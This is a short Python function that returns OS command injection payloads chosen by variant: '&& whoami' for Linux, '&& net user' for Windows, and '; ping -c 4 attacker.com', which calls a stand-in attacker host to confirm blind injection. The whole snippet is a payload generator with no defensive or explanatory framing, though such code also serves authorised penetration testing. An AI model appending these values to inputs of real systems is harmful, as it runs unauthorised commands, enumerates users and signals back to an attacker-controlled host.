def generate(variant):
    payloads = {
        "linux": "&& whoami",
        "windows": "&& net user",
        "ping": "; ping -c 4 attacker.com"
    }
    return payloads.get(variant, "&& whoami")
